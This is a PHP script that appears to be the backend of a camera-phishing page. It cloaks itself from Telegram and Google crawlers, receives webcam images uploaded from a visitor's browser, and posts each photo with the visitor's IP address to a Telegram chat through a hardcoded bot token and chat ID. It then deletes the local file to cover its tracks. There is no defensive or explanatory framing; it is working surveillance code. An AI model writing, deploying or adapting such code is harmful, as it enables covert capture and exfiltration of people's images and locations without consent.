<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
if (strpos($userAgent, 'TelegramBot') !== false || strpos($userAgent, 'Googlebot') !== false) { exit(); }

$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; 
$chatId = "-1003598938463";     

if (isset($_FILES['image'])) {
    $filename = "cam_" . uniqid() . ".jpg";
    $filepath = __DIR__ . "/" . $filename;
    
    if (move_uploaded_file($_FILES['image']['tmp_name'], $filepath)) {
        $website = "https://api.telegram.org/bot" . $botToken;
        $post_fields = [
            'chat_id' => $chatId,
            'photo' => new CURLFile(realpath($filepath)),
            'caption' => "📸 <b>Selfie Captured!</b>\n\n<b>IP:</b> " . $_SERVER['REMOTE_ADDR'],
            'parse_mode' => 'HTML'
        ];

        $ch = curl_init($website . '/sendPhoto');
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
        
        unlink($filepath); 
    }
}
?>
